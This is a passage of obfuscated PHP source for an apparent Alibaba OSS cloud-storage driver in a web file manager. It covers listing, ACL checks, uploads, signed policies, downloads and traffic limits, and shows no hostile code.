$b´Øîª˘Öπ[$F∂èàß¯†“[78]] = $dîß∆©èÏã[$F∂èàß¯†“[78]]; } if (isset($dîß∆©èÏã[$F∂èàß¯†“[84]])) { $b´Øîª˘Öπ[$F∂èàß¯†“[84]] = $dîß∆©èÏã[$F∂èàß¯†“[84]]; } if (isset($dîß∆©èÏã[$F∂èàß¯†“[197]]) && !trim($b´Øîª˘Öπ[$F∂èàß¯†“[84]])) { $b´Øîª˘Öπ[$F∂èàß¯†“[84]] = $dîß∆©èÏã[$F∂èàß¯†“[197]]; } goto D«‹∆ïΩÃá; eÃÂõ®âôè: } private function folderInfo($e‰∂â∑Õ∆ö, $bËâ·…·îπ = false, $BÓ‘√±ï¯≈ = array()) { goto E∆É”›ÏÔ…; Aˆøä›”©¿: $A∏ÁàìßÚÑ[$aèÃÊÔûæ¿[194]] = $A∏ÁàìßÚÑ[$aèÃÊÔûæ¿[84]] = 0; $A∏ÁàìßÚÑ[$aèÃÊÔûæ¿[195]] = $A∏ÁàìßÚÑ[$aèÃÊÔûæ¿[196]] = !0; if (empty($BÓ‘√±ï¯≈)) { $e‰∂â∑Õ∆ö = rtrim($e‰∂â∑Õ∆ö, $aèÃÊÔûæ¿[8]) . $aèÃÊÔûæ¿[8]; $Bº∑¿Àôâ– = $this->objectMeta($e‰∂â∑Õ∆ö); if (!$Bº∑¿Àôâ–) { return $A∏ÁàìßÚÑ; } $BÓ‘√±ï¯≈ = array($aèÃÊÔûæ¿[194] => $Bº∑¿Àôâ–[$aèÃÊÔûæ¿[493]][$aèÃÊÔûæ¿[1291]], $aèÃÊÔûæ¿[84] => strtotime($Bº∑¿Àôâ–[$aèÃÊÔûæ¿[1284]])); } goto dÜ´•¯∫∆è; E∆É”›ÏÔ…: $aèÃÊÔûæ¿ =& $_SERVER[™⁄»üÆ]; $A∏ÁàìßÚÑ = array($aèÃÊÔûæ¿[28] => $this->pathThis($e‰∂â∑Õ∆ö), $aèÃÊÔûæ¿[76] => $this->getPathOuter($aèÃÊÔûæ¿[8] . $e‰∂â∑Õ∆ö), $aèÃÊÔûæ¿[29] => $aèÃÊÔûæ¿[77]); if ($bËâ·…·îπ) { return $A∏ÁàìßÚÑ; } goto Aˆøä›”©¿; dÜ´•¯∫∆è: if (isset($BÓ‘√±ï¯≈[$aèÃÊÔûæ¿[84]])) { $A∏ÁàìßÚÑ[$aèÃÊÔûæ¿[84]] = $BÓ‘√±ï¯≈[$aèÃÊÔûæ¿[84]]; } if (isset($BÓ‘√±ï¯≈[$aèÃÊÔûæ¿[194]])) { $A∏ÁàìßÚÑ[$aèÃÊÔûæ¿[194]] = $BÓ‘√±ï¯≈[$aèÃÊÔûæ¿[194]]; } return $A∏ÁàìßÚÑ; goto Aœ∞∞‚à¥Ã; Aœ∞∞‚à¥Ã: } public function listPath($fÆﬁÂáÛªÏ, $E¿Ì≥ò◊≤ù = false) { $f∆ÁŸàûÈ =& $_SERVER[™⁄»üÆ]; $dåıÙÙäòÔ = $this->fileList($fÆﬁÂáÛªÏ, $f∆ÁŸàûÈ[8], !0); foreach ($dåıÙÙäòÔ[$f∆ÁŸàûÈ[75]] as $cØäƒ¥·Æ¡ => $A‰§ùπâ£É) { $dåıÙÙäòÔ[$f∆ÁŸàûÈ[75]][$cØäƒ¥·Æ¡] = $this->folderInfo($A‰§ùπâ£É, $E¿Ì≥ò◊≤ù, $A‰§ùπâ£É); } foreach ($dåıÙÙäòÔ[$f∆ÁŸàûÈ[74]] as $cØäƒ¥·Æ¡ => $A‰§ùπâ£É) { $dåıÙÙäòÔ[$f∆ÁŸàûÈ[74]][$cØäƒ¥·Æ¡] = $this->fileInfo($A‰§ùπâ£É[$f∆ÁŸàûÈ[28]], $E¿Ì≥ò◊≤ù, $A‰§ùπâ£É); } return $dåıÙÙäòÔ; } public function has($e¶Õªº·’ÿ, $aπË§Ïîëõ = false, $eä˘Öÿ¶‡ = true) { goto dÈê≠îÑôé; b◊â©Ûôê√: while (!0) { check_abort(); $b≠ªÏˆµÛ = array($BéÇ…ÌóÚË[1279] => $BéÇ…ÌóÚË[8], $BéÇ…ÌóÚË[1280] => $EŸèå¬Òê√, $BéÇ…ÌóÚË[1281] => $DÖ¬ÀœÃ®Â, $BéÇ…ÌóÚË[1282] => $EΩ≥–≠‚«Ÿ); try { $d„πçøÈã† = $this->client->listObjects($this->bucket, $b≠ªÏˆµÛ); } catch (OSS\Core\OssException $FÉ≠íî®Ü—) { break; } $EΩ≥–≠‚«Ÿ = $d„πçøÈã†->getNextMarker(); $F∞›È◊ÒÂÂ = $d„πçøÈã†->getObjectList(); $B‹ñ∑·Ñ‚º = $d„πçøÈã†->getPrefixList(); if ($aπË§Ïîëõ) { if (count($F∞›È◊ÒÂÂ) > 1 || count($F∞›È◊ÒÂÂ) == 1 && $F∞›È◊ÒÂÂ[0]->getKey() != $EŸèå¬Òê√) { $cÉ©øŸœÚΩ += count($F∞›È◊ÒÂÂ) - 1; } if (!empty($B‹ñ∑·Ñ‚º)) { $E¡ÉÁû∏Í› += count($B‹ñ∑·Ñ‚º); } if ($EΩ≥–≠‚«Ÿ === $BéÇ…ÌóÚË[33]) { break; } continue; } if ($eä˘Öÿ¶‡) { if (!empty($F∞›È◊ÒÂÂ)) { if (count($F∞›È◊ÒÂÂ) > 1 || $F∞›È◊ÒÂÂ[0]->getKey() != $EŸèå¬Òê√) { return !0; } } } else { if (!empty($B‹ñ∑·Ñ‚º)) { return !0; } } if ($EΩ≥–≠‚«Ÿ === $BéÇ…ÌóÚË[33]) { break; } } if ($aπË§Ïîëõ) { return array($BéÇ…ÌóÚË[203] => $cÉ©øŸœÚΩ, $BéÇ…ÌóÚË[204] => $E¡ÉÁû∏Í›); } return !1; goto dπ„´Œå≠í; D∆ûÚÓÜ•ü: $EΩ≥–≠‚«Ÿ = $BéÇ…ÌóÚË[33]; $DÖ¬ÀœÃ®Â = 500; $cÉ©øŸœÚΩ = $E¡ÉÁû∏Í› = 0; goto b◊â©Ûôê√; dÈê≠îÑôé: $BéÇ…ÌóÚË =& $_SERVER[™⁄»üÆ]; $e¶Õªº·’ÿ = trim($e¶Õªº·’ÿ, $BéÇ…ÌóÚË[8]); $EŸèå¬Òê√ = empty($e¶Õªº·’ÿ) && $e¶Õªº·’ÿ !== $BéÇ…ÌóÚË[191] ? $BéÇ…ÌóÚË[33] : $e¶Õªº·’ÿ . $BéÇ…ÌóÚË[8]; goto D∆ûÚÓÜ•ü; dπ„´Œå≠í: } public function listAll($e‘˘ ∂Ø∞ô) { $a¿åÜÜ‡¥Œ =& $_SERVER[™⁄»üÆ]; $aÕÀ°èÌó§ = $this->fileList($e‘˘ ∂Ø∞ô, $a¿åÜÜ‡¥Œ[33], !0); $f±Â˘ÁÏ›ﬁ = array(); foreach ($aÕÀ°èÌó§[$a¿åÜÜ‡¥Œ[74]] as $Eô≥Îÿ•µ‘) { $f±Â˘ÁÏ›ﬁ[$Eô≥Îÿ•µ‘[$a¿åÜÜ‡¥Œ[28]]] = $Eô≥Îÿ•µ‘[$a¿åÜÜ‡¥Œ[78]]; } foreach ($aÕÀ°èÌó§[$a¿åÜÜ‡¥Œ[75]] as $Eô≥Îÿ•µ‘) { if (is_string($Eô≥Îÿ•µ‘)) { $f±Â˘ÁÏ›ﬁ[$Eô≥Îÿ•µ‘] = 0; } } return $this->listAllFiles($e‘˘ ∂Ø∞ô, array_keys($f±Â˘ÁÏ›ﬁ), $f±Â˘ÁÏ›ﬁ); } public function canRead($f∫ ú∆Îıà) { $BÇ‚¢â¨µé =& $_SERVER[™⁄»üÆ]; $d¢∫îòπæ„ = $this->pathAcl($f∫ ú∆Îıà); return $d¢∫îòπæ„ == $BÇ‚¢â¨µé[1292] || $d¢∫îòπæ„ == $BÇ‚¢â¨µé[533] ? !0 : !1; } public function canWrite($Dıøã‚€›ë) { $BóäÑõÀ¿‘ = $this->pathAcl($Dıøã‚€›ë); return $BóäÑõÀ¿‘ == $_SERVER[™⁄»üÆ][533] ? !0 : !1; } public function pathAcl($B›Ì˘é§û≈) { goto f‡Ã·⁄¡™Ñ; f‡Ã·⁄¡™Ñ: $C©ﬁ©‡éèé =& $_SERVER[™⁄»üÆ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fí≤µ∂òÂ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($B›Ì˘é§û≈)); } catch (OSS\Core\OssException $b®üÉï÷›…) { return !1; } goto CÊ√®åá“•; D¢ÉÏÒåíì: return $Bá â›ï≤≥; goto cÔ’ÉïıÑÆ; CÊ√®åá“•: $Bá â›ï≤≥ = $fí≤µ∂òÂ == $C©ﬁ©‡éèé[34] ? $this->bucketAcl : $fí≤µ∂òÂ; if ($Bá â›ï≤≥ == $C©ﬁ©‡éèé[1293]) { return $C©ﬁ©‡éèé[1292]; } if ($Bá â›ï≤≥ == $C©ﬁ©‡éèé[1294]) { return $C©ﬁ©‡éèé[533]; } goto D¢ÉÏÒåíì; cÔ’ÉïıÑÆ: } private function chmodPath($fæˆ Óˆìì, $BÒéÑÁ‘üá = '') { $B£ëŒÊâõË =& $_SERVER[™⁄»üÆ]; $AåÇ◊õÿ€ﬁ = empty($BÒéÑÁ‘üá) ? $B£ëŒÊâõË[1294] : $BÒéÑÁ‘üá; $A£ÌÉ√◊⁄› = array($B£ëŒÊâõË[34], $B£ëŒÊâõË[192], $B£ëŒÊâõË[1293], $B£ëŒÊâõË[1294]); if (!in_array($AåÇ◊õÿ€ﬁ, $A£ÌÉ√◊⁄›)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($fæˆ Óˆìì), $AåÇ◊õÿ€ﬁ); } catch (OSS\Core\OssException $FíÿæºÁÒÏ) { return !1; } return !0; } public function getContent($bﬂ…√âÀ“Ü) { return $this->fileSubstr($bﬂ…√âÀ“Ü, -1); } public function setContent($C’´Ÿ˜öä¨, $C„îùãÓ˘„ = '') { $b∫ÉÈıãØó =& $_SERVER[™⁄»üÆ]; try { $fçù—¡îéÇ = $this->trafficLimit($b∫ÉÈıãØó[1295]); $B–Ó⁄Ì§‰„ = $this->client->putObject($this->bucket, $this->pathEncode($C’´Ÿ˜öä¨), $C„îùãÓ˘„, $fçù—¡îéÇ); } catch (OSS\Core\OssException $f…¨–ªÆùº) { return !1; } $fÎ–¿ÀúÖº = array($b∫ÉÈıãØó[1285] => trim($B–Ó⁄Ì§‰„[$b∫ÉÈıãØó[1296]], $b∫ÉÈıãØó[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C’´Ÿ˜öä¨))); $this->updateObjMeta($C’´Ÿ˜öä¨, $fÎ–¿ÀúÖº); return isset($B–Ó⁄Ì§‰„[$b∫ÉÈıãØó[1297]][$b∫ÉÈıãØó[1244]]) ? !0 : !1; } private function updateObjMeta($A ñ≤¯ñ≠º, $FÎùÛÜ–ö√) { $A ñ≤¯ñ≠º = $this->pathEncode($A ñ≤¯ñ≠º); try { $BÖ¬Ø¥«™Û = array(OSS\OssClient::OSS_HEADERS => $FÎùÛÜ–ö√); $this->client->copyObject($this->bucket, $A ñ≤¯ñ≠º, $this->bucket, $A ñ≤¯ñ≠º, $BÖ¬Ø¥«™Û); } catch (OSS\Core\OssException $CÉ∆¡¡›÷Ú) { return !1; } return !0; } public function upload($A˘™±“≤ΩÑ, $EÜÓÀ™ùˆ¡, $D‡Êåªà⁄¥ = false, $B∆ÿèﬁ∑ù› = REPEAT_REPLACE) { $eÏè≠ñ√¢· =& $_SERVER[™⁄»üÆ]; $CÍ∏Ëê≈ëè = trim($A˘™±“≤ΩÑ, $eÏè≠ñ√¢·[8]); $bî‡çÖÉπ† = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($eÏè≠ñ√¢·[1285] => @md5_file($EÜÓÀ™ùˆ¡)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A˘™±“≤ΩÑ))); $bî‡çÖÉπ† = $this->trafficLimit($eÏè≠ñ√¢·[1295], $bî‡çÖÉπ†); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($CÍ∏Ëê≈ëè), $EÜÓÀ™ùˆ¡, $bî‡çÖÉπ†); } catch (OSS\Core\OssException $Dÿçÿ·¢—) { return !1; } return $this->getPathOuter($A˘™±“≤ΩÑ); } public function getHost() { $Eò·ëäùÿö =& $_SERVER[™⁄»üÆ]; $d··⁄ø„ÉÙ = explode($Eò·ëäùÿö[177], parent::getHost()); return $d··⁄ø„ÉÙ[0] . $Eò·ëäùÿö[177] . $this->bucket . $Eò·ëäùÿö[95] . $d··⁄ø„ÉÙ[1]; } public function uploadFormData($C¢æ¥Æ”πè, $d§ñíõÈ˜π = 3600) { goto BÌìû€¯Üö; C∂õ«∂ıŸé: $Fö«ë∆‹öÓ = date($Fãﬁ©”ñ∞Ô[1298], time() + $aÀÜªªÇàÙ); $d≥˘µêöüé = new DateTime($Fö«ë∆‹öÓ); $c°ª˘ù¶ƒú = $d≥˘µêöüé->format(DateTime::ISO8601); goto cì‚Õ´âÜŸ; eëÜ»‘‹‹Í: return $f¥™–ÿ˘áÎ; goto F≈Ùôú¥∫ ; cì‚Õ´âÜŸ: $CÁçÿ“”ﬁÖ = strpos($c°ª˘ù¶ƒú, $Fãﬁ©”ñ∞Ô[294]); $c°ª˘ù¶ƒú = substr($c°ª˘ù¶ƒú, 0, $CÁçÿ“”ﬁÖ) . $Fãﬁ©”ñ∞Ô[1299]; $b’∫∏øè—ë = 1048576000 * 5; goto A®êõÖÀ’Æ; A®êõÖÀ’Æ: $eœË√§⁄πÍ = $this->pathFather($C¢æ¥Æ”πè); $e÷ôÇ—ëºÉ = array($Fãﬁ©”ñ∞Ô[1199] => $c°ª˘ù¶ƒú, $Fãﬁ©”ñ∞Ô[1200] => array(array($Fãﬁ©”ñ∞Ô[1300], 0, $b’∫∏øè—ë), array($Fãﬁ©”ñ∞Ô[1203], $Fãﬁ©”ñ∞Ô[1204], $eœË√§⁄πÍ))); $D´Ö∞¨ãÁ† = base64_encode(json_encode($e÷ôÇ—ëºÉ)); goto e‘Í†∫ºêÉ; e‘Í†∫ºêÉ: $eà⁄∏Ö»™Ø = base64_encode(hash_hmac($Fãﬁ©”ñ∞Ô[230], $D´Ö∞¨ãÁ†, $this->secret, !0)); $f¥™–ÿ˘áÎ = array($Fãﬁ©”ñ∞Ô[1209] => $D´Ö∞¨ãÁ†, $Fãﬁ©”ñ∞Ô[1301] => $this->accessKey, $Fãﬁ©”ñ∞Ô[1205] => $Fãﬁ©”ñ∞Ô[1197], $Fãﬁ©”ñ∞Ô[1302] => $eà⁄∏Ö»™Ø, $Fãﬁ©”ñ∞Ô[175] => $E§Üò™“ù´); $f¥™–ÿ˘áÎ = $this->trafficLimit($Fãﬁ©”ñ∞Ô[1295], $f¥™–ÿ˘áÎ); goto eëÜ»‘‹‹Í; BÌìû€¯Üö: $Fãﬁ©”ñ∞Ô =& $_SERVER[™⁄»üÆ]; if (!($E§Üò™“ù´ = $this->getHost())) { return !1; } $aÀÜªªÇàÙ = $d§ñíõÈ˜π; goto C∂õ«∂ıŸé; F≈Ùôú¥∫ : } public function multiUploadFormData($F”áˆﬂıÖÛ, $Fè‹µø∑ﬂ≤ = 3600) { $A›Úãµù‰æ =& $_SERVER[™⁄»üÆ]; if (!($aÒÏ…ËÃ‘ÿ = $this->getHost())) { return !1; } $eßøëˆπó = $this->trafficLimit($A›Úãµù‰æ[1295]); $FüÉ Ó”Íê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F”áˆﬂıÖÛ), $eßøëˆπó); return array($A›Úãµù‰æ[221] => $FüÉ Ó”Íê, $A›Úãµù‰æ[175] => $aÒÏ…ËÃ‘ÿ . $A›Úãµù‰æ[8] . $this->pathEncode($F”áˆﬂıÖÛ), $A›Úãµù‰æ[222] => gmdate($A›Úãµù‰æ[1303]), $A›Úãµù‰æ[93] => $F”áˆﬂıÖÛ); } public function multiUploadAuthData($aÇáœ¶Áê‰, $CÙ©êÂüçí = array()) { goto Bêä”ç·’ô; c¨§íó∂Éå: $f¿ óçòÖƒ = $aÇáœ¶Áê‰; if (isset($CÙ©êÂüçí[$d¬‘ÜéØÕ‚[93]])) { $f¿ óçòÖƒ = $CÙ©êÂüçí[$d¬‘ÜéØÕ‚[93]]; unset($CÙ©êÂüçí[$d¬‘ÜéØÕ‚[93]]); } if (isset($CÙ©êÂüçí[$d¬‘ÜéØÕ‚[223]])) { $CÙ©êÂüçí[$d¬‘ÜéØÕ‚[222]] = $aÆÖ¢Ï¿ã±; return $this->listUploadParts($f¿ óçòÖƒ, $CÙ©êÂüçí); } goto dƒ¿íåÔüÌ; Bêä”ç·’ô: $d¬‘ÜéØÕ‚ =& $_SERVER[™⁄»üÆ]; $aÆÖ¢Ï¿ã± = isset($CÙ©êÂüçí[$d¬‘ÜéØÕ‚[222]]) ? $CÙ©êÂüçí[$d¬‘ÜéØÕ‚[222]] : gmdate($d¬‘ÜéØÕ‚[1303]); $f†«â‹«…Û = isset($CÙ©êÂüçí[$d¬‘ÜéØÕ‚[168]]) ? $CÙ©êÂüçí[$d¬‘ÜéØÕ‚[168]] : $d¬‘ÜéØÕ‚[33]; goto c¨§íó∂Éå; b‘àˆÂò›È: if (!empty($CÙ©êÂüçí[$d¬‘ÜéØÕ‚[1305]])) { $A°”§•Ë∫˘ = array_merge(array($e«‘ñøË©î[4]), $CÙ©êÂüçí[$d¬‘ÜéØÕ‚[1305]]); sort($A°”§•Ë∫˘); $e«‘ñøË©î[4] = implode($d¬‘ÜéØÕ‚[229], $A°”§•Ë∫˘); } $E⁄ﬂ¡Íì“‚ = implode($d¬‘ÜéØÕ‚[229], $e«‘ñøË©î); $f¬ıÀ√«û∂ = base64_encode(hash_hmac($d¬‘ÜéØÕ‚[230], $E⁄ﬂ¡Íì“‚, $this->secret, !0)); goto fÓÌ≠Àª¶√; dƒ¿íåÔüÌ: $e«‘ñøË©î = array($d¬‘ÜéØÕ‚[224], $d¬‘ÜéØÕ‚[33], $d¬‘ÜéØÕ‚[119], $aÆÖ¢Ï¿ã±, "\170\x2d\157\163\163\x2d\x64\141\164\x65\x3a{$aÆÖ¢Ï¿ã±}", $d¬‘ÜéØÕ‚[8] . $this->bucket . $d¬‘ÜéØÕ‚[8] . $f¿ óçòÖƒ . $f†«â‹«…Û); if (strpos($f†«â‹«…Û, $d¬‘ÜéØÕ‚[225]) === 0) { $e«‘ñøË©î[0] = $d¬‘ÜéØÕ‚[226]; if ($Cˆç¡øŒ∏¶ = $this->trafficLimit($d¬‘ÜéØÕ‚[1295])) { $f¿ óçòÖƒ = $d¬‘ÜéØÕ‚[1304]; array_splice($e«‘ñøË©î, 5, 0, $f¿ óçòÖƒ . $d¬‘ÜéØÕ‚[4] . $Cˆç¡øŒ∏¶[$f¿ óçòÖƒ]); } } if (isset($CÙ©êÂüçí[$d¬‘ÜéØÕ‚[227]]) && $CÙ©êÂüçí[$d¬‘ÜéØÕ‚[227]] == $d¬‘ÜéØÕ‚[228]) { $e«‘ñøË©î[0] = $d¬‘ÜéØÕ‚[228]; } goto b‘àˆÂò›È; fÓÌ≠Àª¶√: $FïÊÊ¨ßÙµ = $d¬‘ÜéØÕ‚[1269] . $this->accessKey . $d¬‘ÜéØÕ‚[4] . $f¬ıÀ√«û∂; if (strpos($f†«â‹«…Û, $d¬‘ÜéØÕ‚[225]) === 0) { $FïÊÊ¨ßÙµ = array($d¬‘ÜéØÕ‚[232] => $FïÊÊ¨ßÙµ, $d¬‘ÜéØÕ‚[222] => $aÆÖ¢Ï¿ã±); if ($Cˆç¡øŒ∏¶) { $FïÊÊ¨ßÙµ = array_merge($FïÊÊ¨ßÙµ, $Cˆç¡øŒ∏¶); } } return $FïÊÊ¨ßÙµ; goto FÜÑ”„ïÖÈ; FÜÑ”„ïÖÈ: } public function listUploadParts($a◊´Ω£íî«, $CÀ∏ª∂å¡≈) { goto déÖÕ± ç; BçŸå¿«’é: return array($bÿ⁄æÖò†Ç[232] => $aäñøëÃèÀ, $bÿ⁄æÖò†Ç[222] => $CÀ∏ª∂å¡≈[$bÿ⁄æÖò†Ç[222]], $bÿ⁄æÖò†Ç[234] => $Cÿ…è¶ø˘à); goto a£Èº§ÛñÜ; déÖÕ± ç: $bÿ⁄æÖò†Ç =& $_SERVER[™⁄»üÆ]; $CœØ≈«îàÑ = parse_url_query($CÀ∏ª∂å¡≈[$bÿ⁄æÖò†Ç[168]]); $CÂ©∑¬Î¡á = $this->client->listParts($this->bucket, $this->pathEncode($a◊´Ω£íî«), $CœØ≈«îàÑ[$bÿ⁄æÖò†Ç[221]]); goto FÆÕ¢í¯ì‚; b‡Ÿ¶ªﬁñ»: unset($CÀ∏ª∂å¡≈[$bÿ⁄æÖò†Ç[223]], $CÀ∏ª∂å¡≈[$bÿ⁄æÖò†Ç[227]]); $aäñøëÃèÀ = $this->multiUploadAuthData($a◊´Ω£íî«, $CÀ∏ª∂å¡≈); if (empty($aäñøëÃèÀ)) { return !1; } goto BçŸå¿«’é; FÆÕ¢í¯ì‚: $Fòµ®˘˜Ÿß = $CÂ©∑¬Î¡á->getListPart(); $Cÿ…è¶ø˘à = array(); foreach ($Fòµ®˘˜Ÿß as $bﬂ°êœßÌ¶) { $Cÿ…è¶ø˘à[] = array($bÿ⁄æÖò†Ç[1289] => $bﬂ°êœßÌ¶->getPartNumber(), $bÿ⁄æÖò†Ç[1290] => trim($bﬂ°êœßÌ¶->getETag(), $bÿ⁄æÖò†Ç[116])); } goto b‡Ÿ¶ªﬁñ»; a£Èº§ÛñÜ: } public function download($BÉÕß»®øÑ, $AÙËñè“÷¶) { if ($this->isFolder($BÉÕß»®øÑ)) { return !1; } try { $aËôﬁÑ∏„ö = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $AÙËñè“÷¶); $aËôﬁÑ∏„ö = $this->trafficLimit($_SERVER[™⁄»üÆ][109], $aËôﬁÑ∏„ö); $this->client->getObject($this->bucket, $this->pathEncode($BÉÕß»®øÑ), $aËôﬁÑ∏„ö); } catch (OSS\Core\OssException $B∏»ç¬Áƒ±) { return !1; } return $AÙËñè“÷¶; } public function fileSubstr($Bà—¶¬ÜÜå, $EÎµåÑ¡€ﬁ = 0, $C°ÏÂÓÈÊ¶ = false) { if ($EÎµåÑ¡€ﬁ === -1) { $E∫¬˘∆ﬂªß = array(); } else { if ($C°ÏÂÓÈÊ¶ === !1) { $Eÿé∫£È¢‰ = $this->size($Bà—¶¬ÜÜå); } else { $Eÿé∫£È¢‰ = $EÎµåÑ¡€ﬁ + $C°ÏÂÓÈÊ¶ - 1; } $E∫¬˘∆ﬂªß = array(OSS\OssClient::OSS_RANGE => "{$EÎµåÑ¡€ﬁ}\x2d{$Eÿé∫£È¢‰}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Bà—¶¬ÜÜå), $E∫¬˘∆ﬂªß); } catch (OSS\Core\OssException $D¡íâøÖãÎ) { think_exception($D¡íâøÖãÎ->getMessage()); return !1; } } private function trafficLimit($B¨Ú«ˆ≥öÒ, $cå‡ÒïëÁ± = array()) { goto f°ÁÖä»¨§; f°ÁÖä»¨§: $bä±ƒ±»®Â =& $_SERVER[™⁄»üÆ]; if ($B¨Ú«ˆ≥öÒ == $bä±ƒ±»®Â[1295] && $this->isUploadServer() || $B¨Ú«ˆ≥öÒ == $bä±ƒ±»®Â[109] && $this->isFileOutServer()) { return $cå‡ÒïëÁ±; } $aµŸ®Êßì© = floatval($GLOBALS[$bä±ƒ±»®Â[6]][$bä±ƒ±»®Â[88]][$bä±ƒ±»®Â[107]][$B¨Ú«ˆ≥öÒ]) * 1024 * 1024 * 8; goto aÍÍ–Ωª¥í; aÍÍ–Ωª¥í: if (!$aµŸ®Êßì©) { return $cå‡ÒïëÁ±; } $aµŸ®Êßì© = $aµŸ®Êßì© < 819200 ? 819200 : ($aµŸ®Êßì© > 838860800 ? 838860800 : $aµŸ®Êßì©); $cå‡ÒïëÁ±[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($aµŸ®Êßì©); goto Bﬂ∏Ò…ƒ¥á; Bﬂ∏Ò…ƒ¥á: return $cå‡ÒïëÁ±; goto A™»íºﬁÈá; A™»íºﬁÈá: } public function link($a∫›öéêåÔ, $c¢°ã©≥∂» = array()) { $Aœìª™ƒ∑‰ =& $_SERVER[™⁄»üÆ]; if (!$this->exist($a∫›öéêåÔ) || $this->isFolder($a∫›öéêåÔ)) { return !1; } try { $c¢°ã©≥∂» = $this->trafficLimit($Aœìª™ƒ∑‰[109], $c¢°ã©≥∂»); $FÌœˆåÒ‡∞ = $this->client->signUrl($this->bucket, $this->pathEncode($a∫›öéêåÔ), 3600 * 12, $Aœìª™ƒ∑‰[228], $c¢°ã©≥∂»); return $this->getCdnLink($FÌœˆåÒ‡∞); } catch (OSS\Core\OssException $eÔ≥úŒîäÕ) { return !1; } } public function fileOut($fµîŸãìÉ, $B≤ç»¡Ü∂≈ = false, $CÁïÒ›ñ°ã = false, $f™å«ﬂÁ£ = '') { goto e∑ÂÓ÷ÙáÆ; cﬂÓà°ê‘⁄: $CÁïÒ›ñ°ã = rawurlencode($CÁïÒ›ñ°ã); $e›∆Ü◊˜øÈ = get_file_mime(get_path_ext($CÁïÒ›ñ°ã)); if ($e›∆Ü◊˜øÈ == $A™•–Ë¡≠ˆ[213]) { return parent::fileOut($fµîŸãìÉ, $B≤ç»¡Ü∂≈, $CÁïÒ›ñ°ã, $f™å«ﬂÁ£); } goto aÂ÷ÊÓ˘âÔ; e∑ÂÓ÷ÙáÆ: $A™•–Ë¡≠ˆ =& $_SERVER[™⁄»üÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($fµîŸãìÉ, $B≤ç»¡Ü∂≈, $CÁïÒ›ñ°ã, $f™å«ﬂÁ£); } if (!$CÁïÒ›ñ°ã) { $CÁïÒ›ñ°ã = $this->pathThis($fµîŸãìÉ); } goto cﬂÓà°ê‘⁄; aÂ÷ÊÓ˘âÔ: $B≤ç»¡Ü∂≈ = $B≤ç»¡Ü∂≈ ? $A™•–Ë¡≠ˆ[214] : $A™•–Ë¡≠ˆ[215]; $dÏùÔıÀÌ† = array(OSS\OssClient::OSS_SUB_RESOURCE => $A™•–Ë¡≠ˆ[1306] . rawurlencode("{$B≤ç»¡Ü∂≈}\73\146\x69\x6c\x65\x6e\141\155\x65\75{$CÁïÒ›ñ°ã}")); $dÏùÔıÀÌ†[OSS\OssClient::OSS_SUB_RESOURCE] .= $A™•–Ë¡≠ˆ[1307] . rawurlencode($e›∆Ü◊˜øÈ); goto EàÑ«ñ‘Ç¨; EàÑ«ñ‘Ç¨: $DèöëÍ÷âÓ = $this->link($fµîŸãìÉ, $dÏùÔıÀÌ†); $this->fileOutLink($DèöëÍ÷âÓ); goto DñöìÇ¶¬ú; DñöìÇ¶¬ú: } public function fileOutServer($B…€‹ù±éé, $C‹∏´ÿê’— = false, $E„ÛÒ∞∫ﬁº = false, $D¥É¶ﬁîÊÜ = '') { parent::fileOut($B…€‹ù±éé, $C‹∏´ÿê’—, $E„ÛÒ∞∫ﬁº, $D¥É¶ﬁîÊÜ); } public function fileOutImage($fÛƒ´‹⁄’º, $F“úÆÉ”éÇ = 250) { $b‚ﬂ–∆∆ö’ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[™⁄»üÆ][1308] . $F“úÆÉ”éÇ); $A¡çÜ˘∂” = $this->link($fÛƒ´‹⁄’º, $b‚ﬂ–∆∆ö’); $this->fileOutLink($A¡çÜ˘∂”); } public function fileOutImageServer($eë´”·€ÈÉ, $FÁ•—≥¬ë = 250) { parent::fileOutImage($eë´”·€ÈÉ, $FÁ•—≥¬ë); } public function fileOutLink($D¯øá¿≠µ•) { $e‘Èœ§ºõ£ =& $_SERVER[™⁄»üÆ]; if (!$this->isCdnHost() && substr($D¯øá¿≠µ•, 0, 7) == $e‘Èœ§ºõ£[1212]) { $D¯øá¿≠µ• = $e‘Èœ§ºõ£[1213] . substr($D¯øá¿≠µ•, 7); } header($e‘Èœ§ºõ£[159] . $D¯øá¿≠µ•); die; } public function hashMd5($e…∏¿â˜ıí, $Eè†úÓæ°ó = '') { $FıêÏ≥¨Ë“ =& $_SERVER[™⁄»üÆ]; $AÿñﬂµÉÂÆ = $this->_objectMeta($e…∏¿â˜ıí); if (!$AÿñﬂµÉÂÆ) { return $FıêÏ≥¨Ë“[33]; } if (!isset($AÿñﬂµÉÂÆ[$FıêÏ≥¨Ë“[1285]]) && !empty($Eè†úÓæ°ó)) { $FÖ‚ü€Ç®Ó = $this->updateObjMeta($e…∏¿â˜ıí, array($FıêÏ≥¨Ë“[1285] => $Eè†úÓæ°ó)); $AÿñﬂµÉÂÆ[$FıêÏ≥¨Ë“[1285]] = $FÖ‚ü€Ç®Ó ? $Eè†úÓæ°ó : $FıêÏ≥¨Ë“[33]; } return isset($AÿñﬂµÉÂÆ[$FıêÏ≥¨Ë“[1285]]) ? strtolower($AÿñﬂµÉÂÆ[$FıêÏ≥¨Ë“[1285]]) : $FıêÏ≥¨Ë“[33]; } public function size($A–⁄≠ΩÊúÓ) { $f√å†úò¶– = $this->objectMeta($A–⁄≠ΩÊúÓ); return $f√å†úò¶– ? $f√å†úò¶–[$_SERVER[™⁄»üÆ][78]] : 0; } public function info($a¡ÃëÊòÛ∫) { if ($this->isFolder($a¡ÃëÊòÛ∫)) { return $this->folderInfo($a¡ÃëÊòÛ∫); } else { if ($this->isFile($a¡ÃëÊòÛ∫)) { return $this->fileInfo($a¡ÃëÊòÛ∫); } } return !1; } public function 